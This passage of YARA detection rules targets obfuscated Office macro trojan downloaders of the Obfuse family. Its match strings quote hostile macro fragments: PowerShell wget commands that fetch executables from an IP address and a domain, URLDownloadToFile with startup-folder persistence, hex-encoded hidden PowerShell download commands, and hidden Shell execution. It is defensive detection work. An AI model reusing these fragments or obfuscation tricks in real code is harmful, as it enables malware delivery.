        $x_1_3 = "xxxx = \"workout.js\"" ascii //weight: 1
        $x_1_4 = "zoon = \"wscript \" + koolxxxx" ascii //weight: 1
        $x_1_5 = "CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_6 = "oFile.WriteLine koonmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BAM_2147777876_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BAM!MTB"
        threat_id = "2147777876"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Private Sub asdas()" ascii //weight: 1
        $x_1_2 = "= 1 To Len(mKMMIMCOiatAajjpRufZOIjHZqFbFmXMjMMKnHVrruzAJ) Step 2" ascii //weight: 1
        $x_1_3 = "= sStr + Chr(CLng(\"&H\" & Mid(mKMMIMCOiatAajjpRufZOIjHZqFbFmXMjMMKnHVrruzAJ, i, 2)) - 29)" ascii //weight: 1
        $x_1_4 = "Shell sStr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GCR_2147777998_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GCR!MTB"
        threat_id = "2147777998"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function fasasc227121dacac2ufga32acbshca372(acajbcascacnc7y2222f2f23acshcbashcbasc2)" ascii //weight: 1
        $x_1_2 = "GetObject(afsaf21r23rafasfasf22223afasf(\"131117122121115121128127070\"))" ascii //weight: 1
        $x_1_3 = ".Get(afsaf21r23rafasfasf22223afasf(\"099117122063062107092126123111113127127\")).Create afsaf21r23rafasfasf22223afasf(\"111109120111058113132113\")," ascii //weight: 1
        $x_1_4 = "= Right(hasuhfas9afbujasf, Len(hasuhfas9afbujasf) - 3)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVP_2147778136_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVP!MTB"
        threat_id = "2147778136"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Environ(\"TMP\") & \"\\TestExploit.exe\"" ascii //weight: 1
        $x_1_2 = "CreateObject(lltbpsxgkqpc(\"575363726970742e53\") & lltbpsxgkqpc(\"68656c6c\")" ascii //weight: 1
        $x_1_3 = "wqprhnqyktgkfnilguyz.Run strFilename" ascii //weight: 1
        $x_1_4 = "Chr$(Val(\"&H\" & Mid$(xznlzupfszmg, ccdodxgvngyl, 2))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVQ_2147778210_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVQ!MTB"
        threat_id = "2147778210"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 28 45 6e 76 69 72 6f 6e 28 22 54 65 6d 70 22 29 20 2b 20 22 5c ?? ?? ?? ?? ?? 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Application.Wait (Now + TimeValue(\"0:00:04\"))" ascii //weight: 1
        $x_1_3 = "Replace(val, Chr(i), \"&#\" & i & \";\")" ascii //weight: 1
        $x_1_4 = {78 20 3d 20 44 65 63 72 79 70 74 53 74 72 69 6e 67 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 22 73 64 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "ChrW(\"&h\" & Mid(revval, y, 2))" ascii //weight: 1
        $x_1_6 = "AscW(Mid(chrVal, x, 1)) - AscW(Mid(key, keypos, 1))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVR_2147778286_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVR!MTB"
        threat_id = "2147778286"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 77 77 2e 64 69 61 6d 61 6e 74 65 73 76 69 61 67 65 6e 73 2e 63 6f 6d 2e 62 72 2f 52 75 6e 2e 6a 70 67 22 33 00 55 52 4c 20 3d 20 22 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "Sleep 60000" ascii //weight: 1
        $x_1_3 = "startupfolder = \"C:\\Users\\\"" ascii //weight: 1
        $x_1_4 = "CreateObject(\"WScript.Network\").UserName" ascii //weight: 1
        $x_1_5 = "AppData\\Roaming\\\" + \"Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pp.bat" ascii //weight: 1
        $x_1_6 = "Auxiliar1 = URLDownloadToFile(0, url1, CaminhoLocal, 0, 0)" ascii //weight: 1
        $x_1_7 = "auto_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BOK_2147778789_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BOK!MTB"
        threat_id = "2147778789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Len(Join(Array(\"i00jinV\"" ascii //weight: 1
        $x_1_2 = "= gNSA_3bv0_vBg.EOfTb_wvJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BOK_2147778789_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BOK!MTB"
        threat_id = "2147778789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Join(Array(friTkwQDS &" ascii //weight: 1
        $x_1_2 = "= DhZzF8etYv1nI.JL0ljQwfuKoA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BOK_2147778789_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BOK!MTB"
        threat_id = "2147778789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Len(Join(Array(Ts5bbjF9S," ascii //weight: 1
        $x_1_2 = "= aBdzM_UwU_wOa.RYKf2mHce" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BOK_2147778789_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BOK!MTB"
        threat_id = "2147778789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Len(Join(Array(\"hPAfhpUj\"," ascii //weight: 1
        $x_1_2 = "= zZH6IIgkQfw.we4kYNixhkzG" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BOK_2147778789_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BOK!MTB"
        threat_id = "2147778789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Len(Join(Array(fqAgN_HAEy_LiYO_Z1k" ascii //weight: 1
        $x_1_2 = "= HaEAW_oZu.IZCHsIrtHxIs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BOK_2147778789_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BOK!MTB"
        threat_id = "2147778789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Len(Join(Array(YqDSW0UXyqZCH9J" ascii //weight: 1
        $x_1_2 = "= NpJGX_v4Gv_RmO_1mMX.JQbAN_TmkL_hm5_gi2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BOK_2147778789_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BOK!MTB"
        threat_id = "2147778789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Len(Join(Array(\"KLAiRzTEhymYN4bvk\"," ascii //weight: 1
        $x_1_2 = "= pGfDl_scDd_u32S.HNJi_khie_VjOD_CoFe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BOK_2147778789_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BOK!MTB"
        threat_id = "2147778789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Len(Join(Array(\"BGNAn_d7x_uKU N0Vrt_Pny_JBZc\"" ascii //weight: 1
        $x_1_2 = "= fskc9_uhl5_cEz4.yUMKR_m5Y" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BOK_2147778789_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BOK!MTB"
        threat_id = "2147778789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "POWERshEll.ExE wGet http://194.195.209.88/applauchh.exe" ascii //weight: 1
        $x_1_2 = "POWERshEll.ExE wGet https://arturkarolczakshiola.com/jazz/tg6Nrmq9tDO7bTI.exe" ascii //weight: 1
        $x_1_3 = "outFIlE o.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MOY_2147778806_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MOY!MTB"
        threat_id = "2147778806"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".ShowWindow = CLng((" ascii //weight: 1
        $x_1_2 = {2e 43 72 65 61 74 65 20 [0-32] 2c 20 4e 75 6c 6c 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {53 65 74 20 [0-32] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-32] 29 2e 53 70 61 77 6e 49 6e 73 74 61 6e 63 65 5f}  //weight: 1, accuracy: Low
        $x_1_4 = "& ChrW(CLng((AscW(\"" ascii //weight: 1
        $x_1_5 = "Debug.Print " ascii //weight: 1
        $x_1_6 = {3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 53 70 6c 69 74 28 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HPU_2147778837_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HPU!MTB"
        threat_id = "2147778837"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "meinkonhun.EXEC listen1 + madar2 + janu3 + fakir4" ascii //weight: 1
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 22 20 2b 20 49 6e 74 32 53 74 72 28 22 [0-10] 22 29 20 2b 20 49 6e 74 32 53 74 72 28 22}  //weight: 1, accuracy: Low
        $x_1_3 = "Function Auto_Close() As String" ascii //weight: 1
        $x_1_4 = "GoTo yyxCZgnRfeuxA" ascii //weight: 1
        $x_1_5 = "KnDVqJDtZiihmQPQBO:" ascii //weight: 1
        $x_1_6 = "sName = Mid(sText, I, 3)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HPV_2147778962_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HPV!MTB"
        threat_id = "2147778962"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 28 ?? ?? ?? ?? 28 22 [0-30] 22 29 29 2e 47 65 74 28 ?? ?? ?? ?? 28 22 [0-40] 22 29 29 2e 43 72 65 61 74 65 20 [0-10] 2c 20 [0-10] 2c 20 [0-10] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4f 61 74 [0-10] 20 2b 20 [0-10] 28 [0-15] 28 [0-10] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4c 6f 6f 70 20 57 68 69 6c 65 20 4c 65 6e 28 [0-10] 29 20 3e 20 30}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 69 67 68 74 28 [0-10] 2c 20 4c 65 6e 28 [0-10] 29 20 2d 20 33 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 4c 65 66 74 28 [0-10] 2c 20 33 29}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 43 68 72 28 [0-10] 20 2d 20 ?? ?? 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HPW_2147778964_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HPW!MTB"
        threat_id = "2147778964"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 28 [0-30] 28 22 31 22 20 2b 20 22 22 20 2b 20 22 33 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 31 31 31 37 22 20 2b 20 22 31 32 22 20 2b 20 22 22 20 2b 20 22 32 31 22 20 2b 20 22 32 31 22 20 2b 20 22 31 31 35 31 32 31 31 22 20 2b 20 79 20 2b 20 79 20 2b 20 79 20 2b 20 22 32 38 31 32 37 30 37 30 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 47 65 74 28 [0-30] 28 22 30 39 39 22 20 2b 20 79 20 2b 20 79 20 2b 20 79 20 2b 20 22 31 22 20 2b 20 79 20 2b 20 22 31 22 20 2b 20 22 37 31 32 32 30 36 33 30 36 32 31 22 20 2b 20 79 20 2b 20 79 20 2b 20 79 20 2b 20 22 30 22 20 2b 20 22 37 22 20 2b 20 22 30 22 20 2b 20 22 39 22 20 2b 20 22 32 22 20 2b 20 22 31 32 22 20 2b 20 79 20 2b 20 79 20 2b 20 22 36 31 32 33 31 31 22 20 2b 20 79 20 2b 20 22 31 31 31 22 20 2b 20 22 22 20 2b 20 79 20 2b 20 22 33 22 20 2b 20 22 31 32 37 31 32 37 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 20 [0-30] 28 22 31 31 31 31 30 39 31 32 30 31 22 20 2b 20 22 31 31 22 20 2b 20 79 20 2b 20 79 20 2b 20 22 30 35 38 31 31 33 31 33 32 31 31 33 22 29 2c 20 61 61 63 73 61 73 63 61 37 73 63 61 37 63 61 73 63 76 61 73 63 63 73 61 73 63 61 37 73 63 61 37 63 61 73 63 76 61 73 63 2c 20 61 63 73 61 73 63 61 37 73 63 61 37 63 61 73 63 76 61 73 63 2c 20 73 61 63 61 73 63 61 73 63 61 63 73 61 73 63 61 37 73 63 61 37 63 61 73 63 76 61 73 63}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 68 72 28 [0-40] 20 2d 20 31 32 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 52 69 67 68 74 28 [0-20] 2c 20 4c 65 6e 28 [0-20] 29 20 2d 20 33 29}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 4f 61 74 [0-20] 20 2b 20 [0-20] 28 [0-40] 28 [0-20] 29 29}  //weight: 1, accuracy: Low
        $x_1_7 = {4c 6f 6f 70 20 57 68 69 6c 65 20 4c 65 6e 28 [0-20] 29 20 3e 20 30}  //weight: 1, accuracy: Low
        $x_1_8 = {3d 20 4c 65 66 74 28 [0-40] 2c 20 33 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HPX_2147778965_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HPX!MTB"
        threat_id = "2147778965"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(afsaf21r23rafasfasf22223afasf(\"1\" + \"\" + \"3\" + \"\" + \"\" + \"1117\" + \"12\" + \"\" + \"21\" + \"21\" + \"1151211\" + y + y + y + \"28127070\"))" ascii //weight: 1
        $x_1_2 = ".Get(afsaf21r23rafasfasf22223afasf(\"099\" + y + y + y + \"1\" + y + \"1\" + \"71220630621\" + y + y + y + \"0\" + \"7\" + \"0\" + \"9\" + \"2\" + \"12\" + y + y + \"612311\" + y + \"111\" + \"\" + y + \"3\" + \"127127\"))" ascii //weight: 1
        $x_1_3 = ".Create afsaf21r23rafasfasf22223afasf(\"1111091201\" + \"11\" + y + y + \"058113132113\"), aacsasca7sca7cascvasccsasca7sca7cascvasc, acsasca7sca7cascvasc, sacascascacsasca7sca7cascvasc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HPY_2147778968_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HPY!MTB"
        threat_id = "2147778968"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "687474703A2F2F7365762E6D696C656E" ascii //weight: 1
        $x_1_2 = "2E5368656C6C457865637574652824656E763A54656D702B275C676C662E6578652729" ascii //weight: 1
        $x_1_3 = "Call Shell(ChrEncode" ascii //weight: 1
        $x_1_4 = "706F7765727368656C6C2E657865202D657865637574696F6E706F6C69637920627970617373202D572048696464656E202D636F6D6D616E64" ascii //weight: 1
        $x_1_5 = "= sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)))" ascii //weight: 1
        $x_1_6 = "2E446F776E6C6F616446696C65" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_R_2147779061_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.R!MTB"
        threat_id = "2147779061"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= juy___gt(156) & juy___gt(152) & juy___gt(136) & juy___gt(183) & juy___gt(174) & juy___gt(181) & juy___gt(185) & juy___gt(115) & juy___gt(184) & juy___gt(173) & juy___gt(170) & juy___gt(177) & juy___gt(177)" ascii //weight: 1
        $x_1_2 = {53 65 74 20 [0-15] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-15] 29 0d 0a [0-15] 20 3d 20 30 0d 0a [0-15] 20 3d 20 00 2e 52 75 6e 28 [0-15] 2c 20 [0-15] 29}  //weight: 1, accuracy: Low
        $x_1_3 = "oigfd = \"vdbgd gfdb fsvv + vfder" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ZB_2147779078_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZB!MTB"
        threat_id = "2147779078"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Environ(MyFu_RXQYE_20210329_" ascii //weight: 1
        $x_1_2 = ".Namespace(unZipFolderName).CopyHere obrqxjxbZiRXQYEpIt_RXQYE_20210329_092748_" ascii //weight: 1
        $x_1_3 = "fso.CreateTextFile(filePath)" ascii //weight: 1
        $x_1_4 = "Result & Mid(CellRef, i, 1)" ascii //weight: 1
        $x_1_5 = "GetTempFolder & GenerateRa_RXQYE_20210329_092748_rqxjx_ndomString" ascii //weight: 1
        $x_1_6 = "GetAppDataFolder & MyFu_RXQYE_20210329_092748_rqxjx_nc23" ascii //weight: 1
        $x_1_7 = "Shell rurqxjxnnRXQYEe_RXQYE_20210329_092748_rqxjx_r, vbHide" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ZC_2147779086_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZC!MTB"
        threat_id = "2147779086"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 28 [0-3] 20 2d 20 36 31 29}  //weight: 1, accuracy: Low
        $x_1_2 = ".Run(D__n9Su8E4WjZScRg3izADYX2w_" ascii //weight: 1
        $x_1_3 = "CreateObject(QY2OJqE1QqhCe9cayPSx2MleIfUxeNnRdwz" ascii //weight: 1
        $x_1_4 = "Ro = Ro &" ascii //weight: 1
        $x_1_5 = {6d 6b 5f 6c 6c 28 [0-3] 29 20 26 20 6d 6b 5f 6c 6c 28 [0-3] 29 20 26}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVS_2147779102_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVS!MTB"
        threat_id = "2147779102"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WinExec UCase(\"cmd /c c:\\programdata\\advs.\")" ascii //weight: 1
        $x_1_2 = "String(1, \"c\") + String(1, \"M\") + String(1, \"d\") For Output As #1" ascii //weight: 1
        $x_1_3 = "Print #1, vbCrLf + Animated.Invaders.Caption + vbCrLf + CStr(CDate(\"11/01/1998\"))" ascii //weight: 1
        $x_1_4 = "TextBox1.Text & \"  \" & ChrW(i)" ascii //weight: 1
        $x_1_5 = "zoeaoI0pamOIhj = InStr(TRAFaFSL73, \"ge\", _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVT_2147779108_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVT!MTB"
        threat_id = "2147779108"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"W\" + \"Sc\" + \"r\" + \"\" + \"i\" + \"pt\" + \"\" + \".\" + \"S\" + \"hel\" + \"\" + \"\" + \"\" + \"\" + \"l\")" ascii //weight: 1
        $x_1_2 = "edFlFxCGC.Run(\"\" + hJAEoBklj + \"\", 0, False)" ascii //weight: 1
